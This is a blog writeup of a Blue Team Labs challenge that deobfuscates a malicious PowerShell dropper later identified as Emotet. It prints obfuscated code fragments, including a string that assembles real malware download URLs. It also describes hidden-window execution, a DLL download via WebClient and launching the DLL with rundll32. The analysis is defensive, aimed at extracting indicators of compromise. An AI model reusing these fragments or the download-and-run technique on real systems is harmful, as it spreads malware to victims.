@@ -1,0 +1,238 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[BTLO] Malicious PowerShell Analysis Writeup // Fl1x&#39;s Blog</title>
+    <link rel="shortcut icon" href="/favicon.png" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Fl1x" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://fl1xh.github.io/css/main.min.1bc859b2ee25b22dbec58da2d1c0e9938e1e25416538a5ebf1505ce69f7a3327.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[BTLO] Malicious PowerShell Analysis Writeup"/>
+<meta name="twitter:description" content="Introduction  Question 1 Question 2 Question 3 Question 4 Question 5 Question 6   Conclusion    Introduction As its name suggests, this challenge will allow us to analyze a malicious powershell file.
+CyberChef is often a useful tool for this sort of analysis and we’re gonna use it.
+After downloading the .zip archive, we get a file called &quot;ps_script.txt&quot;.
+Here we get the content with a simple cat command."/>
+
+    <meta property="og:title" content="[BTLO] Malicious PowerShell Analysis Writeup" />
+<meta property="og:description" content="Introduction  Question 1 Question 2 Question 3 Question 4 Question 5 Question 6   Conclusion    Introduction As its name suggests, this challenge will allow us to analyze a malicious powershell file.
+CyberChef is often a useful tool for this sort of analysis and we’re gonna use it.
+After downloading the .zip archive, we get a file called &quot;ps_script.txt&quot;.
+Here we get the content with a simple cat command." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fl1xh.github.io/posts/wu_btlo_malicious_powershell_analysis/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-06T12:07:11+02:00" />
+<meta property="article:modified_time" content="2022-04-06T12:07:11+02:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://fl1xh.github.io/"><img class="app-header-avatar" src="/pp.jpg" alt="Fl1x" /></a>
+      <h1>Fl1x&#39;s Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Posts</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/redteam/">RedTeam</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/blueteam/">BlueTeam</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/writeups/">Writeups</a>
+      </nav>
+      <p>Here you can find my infosec, sysadmin articles and writeups</p>
+      <div class="app-header-social">
+        
+          <a href="https://twitter.com/fl1x_HR" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/Fl1xH" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.hackthebox.com/home/users/profile/104662" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-box">
+  <title>Hackthebox</title>
+  <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line>
+</svg>
+          </a>
+        
+          <a href="https://blueteamlabs.online/public/user/3c4848eb92c6232d4eede7" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-cloud">
+  <title>Blue Teams Labs Online</title>
+  <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"></path>
+</svg>
+          </a>
+        
+          <a href="https://cyberdefenders.org/profile/Fl1xH" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-shield">
+  <title>Cyberdefenders.org</title>
+  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+</svg>
+          </a>
+        
+          <a href="https://fl1xh.github.io/feed.xml" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-rss">
+  <title>RSS Feed</title>
+  <path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[BTLO] Malicious PowerShell Analysis Writeup</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 6, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://fl1xh.github.io/tags/writeups/">Writeups</a>
+              <a class="tag" href="https://fl1xh.github.io/tags/blueteam/">BlueTeam</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <hr>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#question-1">Question 1</a></li>
+        <li><a href="#question-2">Question 2</a></li>
+        <li><a href="#question-3">Question 3</a></li>
+        <li><a href="#question-4">Question 4</a></li>
+        <li><a href="#question-5">Question 5</a></li>
+        <li><a href="#question-6">Question 6</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+<hr>
+<h2 id="introduction">Introduction</h2>
+<p>As its name suggests, this challenge will allow us to analyze a malicious powershell file.</p>
+<p><img src="/BTLO/enonce.png" alt=""></p>
+<p><a href="https://gchq.github.io/CyberChef/">CyberChef</a> is often a useful tool for this sort of analysis and we’re gonna use it.</p>
+<p>After downloading the <code>.zip</code> archive, we get a file called <code>&quot;ps_script.txt&quot;</code>.</p>
+<p>Here we get the content with a simple <code>cat</code> command.
+<img src="/BTLO/carbon.png" alt=""></p>
+<p><code>POwersheLL -w hidden</code> means that a hidden PowerShell window (invisible to the user) is opened, and <code>-ENCOD</code>, shorthand for encoded shows that the script was encoded with Base64.</p>
+<p><img src="/BTLO/pw_script2.png" alt=""></p>
+<p>Using CyberChef, we decode the payload using the recipe &ldquo;From Base64&rdquo; and &ldquo;Decode text&rdquo; (remove dots, null bytes).</p>
+<p>As we see, the script is obfuscated. We decided to use a tool called PSDecode, availbable on github (<a href="https://github.com/R3MRUM/PSDecode)">https://github.com/R3MRUM/PSDecode)</a>.
+This tool allows us to deobfuscate the code with several layers obfuscation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">PSDecode -dump -beautify -verbose .\pw_script.ps1
+</code></pre></div><p><img src="/BTLO/pw_script3.png" alt=""></p>
+<p><img src="/BTLO/pw_script4.png" alt=""></p>
+<p>Now we get a better view of the malicious script.</p>
+<h3 id="question-1">Question 1</h3>
+<p><strong>What security protocol is being used for the communication with a malicious domain?</strong></p>
+<p>Here it&rsquo;s asking which protocol is the malware using to mask the communication to the malicious domain. We think about encryption protocols like SSL, TLS, &hellip;</p>
+<p><img src="/BTLO/pw_script5.png" alt=""></p>
+<p>The Layer 2 of PSDecode gives us the <code>securityprotocol</code> equal to <code>Tls12</code> which means it&rsquo;s TLS using the version 1.2.
+We put this into the answer and it works.</p>
+<p>Answer: <code>TLS 1.2</code></p>
+<h3 id="question-2">Question 2</h3>
+<p><strong>What directory does the obfuscated PowerShell create? (Starting from \HOME)</strong></p>
+<p>Here, we search for the name of the folder that will be created when the malicious script is launched.</p>
+<p>We can already see that there’s a <code>createdirectory</code> value, which gets set to <code>$HOME</code> with a long string following it.</p>
+<p><img src="/BTLO/pw_script6.png" alt=""></p>
+<p>With the <code>echo</code> command on our Powershell prompt, we got the directories. It looks to be relatively simple string concatenation with substitution of <code>UOH</code> to <code>[string][char]92</code>, which is <code>\</code>, for <code>{0}</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell"><span style="color:#0087ff">echo </span>$((<span style="color:#00afaf">&#39;{0}Db_bh30{0}Yf5be5g{0}&#39;</span>) -F <span style="color:#d75f00">[char]</span>92)
+</code></pre></div><p><img src="/BTLO/pw_script7.png" alt=""></p>
+<p>We simply add the <code>$HOME</code> value to our path and gets the flag.</p>
+<p>Answer: <code>\HOME\Db_bh30\Yf5be5g\</code></p>
+<h3 id="question-3">Question 3</h3>
+<p><strong>What file is being downloaded (full name)?</strong></p>
+<p>For this question we already think of &ldquo;How a file can be downloaded	using powershell commands ?&rdquo;
+The answer of this question can be a simple &ldquo;WebClient.DownloadFile&rdquo; method and we got right.</p>
+<p><img src="/BTLO/webgetfile.png" alt=""></p>
+<p>From the previous question, we saw a <code>$HOME</code> path were 2 directories were created especially for a file that being downloaded from the malicious domain.</p>
+<p><img src="/BTLO/microsoftweb.png" alt=""></p>
+<p>On the official Microsoft documention of the web method used, it depends on 2 variables. In our case, the two variables are <code>$Bm5pw6z</code> and <code>$Imd1yck</code>.</p>
+<p><img src="/BTLO/pw_script8.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell"><span style="color:#0087ff">$Swrp6tc</span> = ((<span style="color:#00afaf">&#39;A69&#39;</span>)+<span style="color:#00afaf">&#39;S&#39;</span>)
+<span style="color:#0087ff">$Imd1yck</span>=<span style="color:#0087ff">$HOME</span>+(((<span style="color:#00afaf">&#39;UOHDb_&#39;</span>)+<span style="color:#00afaf">&#39;&#39;</span>)+<span style="color:#0087ff">$Swrp6tc</span>+((<span style="color:#00afaf">&#39;.dl&#39;</span>)+<span style="color:#00afaf">&#39;l&#39;</span>)
+</code></pre></div><p>The WebClient method using the <code>$Imd1yck</code> variable and here we see, it&rsquo;s concatenated with an other variable <code>$Swrp6tc</code>.
+We know that the file is a <code>.dll</code> file.</p>
+<p><img src="/BTLO/pw_script9.png" alt=""></p>
+<p>Using the powershell prompt, we get the file name which downloaded by the script.</p>
+<p>Answer: <code>A69S.dll</code></p>
+<h3 id="question-4">Question 4</h3>
+<p><strong>What is used to execute the downloaded file?</strong></p>
+<p>On the previous question, we saw the &ldquo;WebClient.DownloadFile&rdquo; used on the malware to get the malicious <code>.dll</code>.</p>
+<p><img src="/BTLO/pw_script10.png" alt=""></p>
+<p>There is <code>$Imd1yck</code>, the full path of previous directories found and the malicious A69S.dll file. With the <code>Get-Item</code> module, the script retrieves the downloaded file and launches it with the following program: &ldquo;rundll32&rdquo; as we can see on the picture.</p>
+<p>Answer: <code>rundll32</code></p>
+<h3 id="question-5">Question 5</h3>
+<p><strong>What is the domain name of the URI ending in ‘/6F2gd/’ ?</strong></p>
+<p>Here we need to find urls in the malicious file. I don&rsquo;t know why, but PSDecode didn&rsquo;t show urls on the layer 2 deobfuscation.
+So we are going to use the first layer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell"><span style="color:#0087ff">$B9fhbyv</span>=(<span style="color:#00afaf">&#39;]&#39;</span>+(<span style="color:#00afaf">&#39;a&#39;</span>+<span style="color:#00afaf">&#39;nw[3s://adm&#39;</span>+<span style="color:#00afaf">&#39;int&#39;</span>+<span style="color:#00afaf">&#39;k.c&#39;</span>+<span style="color:#00afaf">&#39;o&#39;</span>+<span style="color:#00afaf">&#39;m/&#39;</span>+<span style="color:#00afaf">&#39;w&#39;</span>)+(<span style="color:#00afaf">&#39;p-adm&#39;</span>+<span style="color:#00afaf">&#39;in/&#39;</span>+<span style="color:#00afaf">&#39;L/&#39;</span>)+<span style="color:#00afaf">&#39;@&#39;</span>+(<span style="color:#00afaf">&#39;]a&#39;</span>+<span style="color:#00afaf">&#39;n&#39;</span>+<span style="color:#00afaf">&#39;w[3s&#39;</span>)+<span style="color:#00afaf">&#39;:&#39;</span>+<span style="color:#00afaf">&#39;/&#39;</span>+<span style="color:#00afaf">&#39;/m&#39;</span>+(<span style="color:#00afaf">&#39;ike&#39;</span>+<span style="color:#00afaf">&#39;ge&#39;</span>)+(<span style="color:#00afaf">&#39;e&#39;</span>+<span style="color:#00afaf">&#39;r&#39;</span>+<span style="color:#00afaf">&#39;inck.&#39;</span>)+(<span style="color:#00afaf">&#39;c&#39;</span>+<span style="color:#00afaf">&#39;om&#39;</span>)+(<span style="color:#00afaf">&#39;/c/&#39;</span>+<span style="color:#00afaf">&#39;Y&#39;</span>+<span style="color:#00afaf">&#39;Ys&#39;</span>)+<span style="color:#00afaf">&#39;a&#39;</span>+(<span style="color:#00afaf">&#39;/@]&#39;</span>+<span style="color:#00afaf">&#39;anw&#39;</span>+<span style="color:#00afaf">&#39;[&#39;</span>+<span style="color:#00afaf">&#39;3://free&#39;</span>+<span style="color:#00afaf">&#39;lanc&#39;</span>+<span style="color:#00afaf">&#39;e&#39;</span>+<span style="color:#00afaf">&#39;rw&#39;</span>)+(<span style="color:#00afaf">&#39;ebdesi&#39;</span>+<span style="color:#00afaf">&#39;gnerh&#39;</span>+<span style="color:#00afaf">&#39;yd&#39;</span>)+(<span style="color:#00afaf">&#39;er&#39;</span>+<span style="color:#00afaf">&#39;aba&#39;</span>)+(<span style="color:#00afaf">&#39;d.&#39;</span>+<span style="color:#00afaf">&#39;com/&#39;</span>)+(<span style="color:#00afaf">&#39;cgi&#39;</span>+<span style="color:#00afaf">&#39;-bin&#39;</span>+<span style="color:#00afaf">&#39;/S&#39;</span>)+(<span style="color:#00afaf">&#39;/&#39;</span>+<span style="color:#00afaf">&#39;@&#39;</span>+<span style="color:#00afaf">&#39;]anw&#39;</span>)+(<span style="color:#00afaf">&#39;[3&#39;</span>+<span style="color:#00afaf">&#39;://&#39;</span>+<span style="color:#00afaf">&#39;etdog.co&#39;</span>+<span style="color:#00afaf">&#39;m&#39;</span>+<span style="color:#00afaf">&#39;/w&#39;</span>)+(<span style="color:#00afaf">&#39;p-&#39;</span>+<span style="color:#00afaf">&#39;co&#39;</span>)+<span style="color:#00afaf">&#39;nt&#39;</span>+(<span style="color:#00afaf">&#39;e&#39;</span>+<span style="color:#00afaf">&#39;nt&#39;</span>)+(<span style="color:#00afaf">&#39;/n&#39;</span>+<span style="color:#00afaf">&#39;u/@&#39;</span>)+(<span style="color:#00afaf">&#39;]a&#39;</span>+<span style="color:#00afaf">&#39;nw[3&#39;</span>)+<span style="color:#00afaf">&#39;s&#39;</span>+(<span style="color:#00afaf">&#39;://&#39;</span>+<span style="color:#00afaf">&#39;www&#39;</span>+<span style="color:#00afaf">&#39;.hintu&#39;</span>+<span style="color:#00afaf">&#39;p.c&#39;</span>)+(<span style="color:#00afaf">&#39;o&#39;</span>+<span style="color:#00afaf">&#39;m.&#39;</span>)+(<span style="color:#00afaf">&#39;b&#39;</span>+<span style="color:#00afaf">&#39;r/&#39;</span>)+<span style="color:#00afaf">&#39;w&#39;</span>+(<span style="color:#00afaf">&#39;p&#39;</span>+<span style="color:#00afaf">&#39;-co&#39;</span>)+(<span style="color:#00afaf">&#39;n&#39;</span>+<span style="color:#00afaf">&#39;ten&#39;</span>)+(<span style="color:#00afaf">&#39;t&#39;</span>+<span style="color:#00afaf">&#39;/dE/&#39;</span>+<span style="color:#00afaf">&#39;@]a&#39;</span>+<span style="color:#00afaf">&#39;nw[3://&#39;</span>+<span style="color:#00afaf">&#39;www.&#39;</span>)+<span style="color:#00afaf">&#39;s&#39;</span>+(<span style="color:#00afaf">&#39;tm&#39;</span>+<span style="color:#00afaf">&#39;arouns&#39;</span>+<span style="color:#00afaf">&#39;.&#39;</span>)+(<span style="color:#00afaf">&#39;ns&#39;</span>+<span style="color:#00afaf">&#39;w&#39;</span>)+(<span style="color:#00afaf">&#39;.&#39;</span>+<span style="color:#00afaf">&#39;edu.au/p&#39;</span>+<span style="color:#00afaf">&#39;a&#39;</span>+<span style="color:#00afaf">&#39;y&#39;</span>+<span style="color:#00afaf">&#39;pal/b8&#39;</span>)+(<span style="color:#00afaf">&#39;G&#39;</span>+<span style="color:#00afaf">&#39;/@]&#39;</span>)+(<span style="color:#00afaf">&#39;a&#39;</span>+<span style="color:#00afaf">&#39;nw[&#39;</span>)+(<span style="color:#00afaf">&#39;3:&#39;</span>+<span style="color:#00afaf">&#39;/&#39;</span>)+(<span style="color:#00afaf">&#39;/&#39;</span>+<span style="color:#00afaf">&#39;wm.mcdeve&#39;</span>+<span style="color:#00afaf">&#39;lop.net&#39;</span>+<span style="color:#00afaf">&#39;/&#39;</span>+<span style="color:#00afaf">&#39;c&#39;</span>+<span style="color:#00afaf">&#39;on&#39;</span>+<span style="color:#00afaf">&#39;t&#39;</span>+<span style="color:#00afaf">&#39;e&#39;</span>)+(<span style="color:#00afaf">&#39;nt&#39;</span>+<span style="color:#00afaf">&#39;/&#39;</span>)+<span style="color:#00afaf">&#39;6&#39;</span>+(<span style="color:#00afaf">&#39;F2&#39;</span>+<span style="color:#00afaf">&#39;gd/&#39;</span>)).<span style="color:#00afaf">&#34;RE`p`lACe&#34;</span>(((<span style="color:#00afaf">&#39;]a&#39;</span>+<span style="color:#00afaf">&#39;n&#39;</span>)+(<span style="color:#00afaf">&#39;w&#39;</span>+<span style="color:#00afaf">&#39;[3&#39;</span>)),(<span style="color:#d75f00">[array]</span>(<span style="color:#00afaf">&#39;sd&#39;</span>,<span style="color:#00afaf">&#39;sw&#39;</span>),((<span style="color:#00afaf">&#39;h&#39;</span>+<span style="color:#00afaf">&#39;tt&#39;</span>)+<span style="color:#00afaf">&#39;p&#39;</span>),<span style="color:#00afaf">&#39;3d&#39;</span>)[1]).<span style="color:#00afaf">&#34;s`PLIT&#34;</span>(<span style="color:#0087ff">$C83R</span> + <span style="color:#0087ff">$Cvmmq4o</span> + <span style="color:#0087ff">$F10Q</span>);
+</code></pre></div><p>A variable (<code>$B9fhbyv</code>) we see, is a very long string with many &ldquo;hints&rdquo; that make us think of characters present in a url like &ldquo;://&rdquo; or &ldquo;com&rdquo;.</p>
+<p><img src="/BTLO/pw_script11.png" alt=""></p>
+<p>Now, we return in our prompt to simply do a <code>echo</code> command on that variable and see the directory &ldquo;/6F2gd/&rdquo; written in the question.
+And it worked, go to the last question of the challenge.</p>
+<p>Answer: <code>wm.mcdevelop.net</code></p>
+<h3 id="question-6">Question 6</h3>
+<p><strong>Based on the analysis of the obfuscated code, what is the name of the malware?</strong></p>
+<p>My first step here was to directly found a &ldquo;file name&rdquo; of the malware, looking at the script but I didn&rsquo;t found anything.
+I remembered the last question were we found the malicious domain of the hackers organisation so I search the domain name on Google.</p>
+<p><img src="/BTLO/malware1.png" alt=""></p>
+<p>First result is a website that I know very well !</p>
+<p>URLHaus is a project from abuse.ch with the goal of sharing malicious URLs that are being used for malware distribution.</p>
+<p><img src="/BTLO/malware2.png" alt=""></p>
+<p>On the &ldquo;Tags&rdquo; section there is &ldquo;emotet&rdquo;, very known malware type. It&rsquo;s the final answer, we now have complete the challenge!</p>
+<p>Answer: <code>emotet</code></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Despite heavy obfucsation, we were able to read through the script and pull out key Indicators of Compromise, ultimately leading us to identifying the name of the malware.</p>
+<p>Check out the <a href="https://blueteamlabs.online">BTLO</a> platform if you interested in BlueTeam challenges and labs!</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
